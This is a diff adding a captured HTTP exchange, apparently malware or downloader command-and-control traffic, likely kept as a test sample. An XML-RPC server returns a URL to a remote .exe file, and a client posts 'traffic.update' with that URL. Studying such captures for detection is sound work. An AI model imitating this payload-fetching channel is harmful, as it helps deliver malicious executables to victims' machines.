@@ -1,0 +1,27 @@
+HTTP/1.1 200 OK
+Date: Mon, 07 Mar 2011 03:52:58 GMT
+Server: Apache
+Connection: close
+Content-Length: 199
+Vary: Accept-Encoding
+Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<methodResponse>
+<params>
+ <param>
+  <value>
+   <string>http://www.cookst.com/sentry/api/20110306.exe</string>
+  </value>
+ </param>
+</params>
+</methodResponse>
+POST /sentry/api/server.php HTTP/1.1
+User-Agent: XMLRPC++ 0.7
+Host: www.cookst.com:80
+Content-Type: text/xml
+Content-length: 183
+
+<?xml version="1.0"?>
+<methodCall><methodName>traffic.update</methodName>
+<params><param><value>http://www.cookst.com/sentry/api/20110306.exe</value></param></params></methodCall>
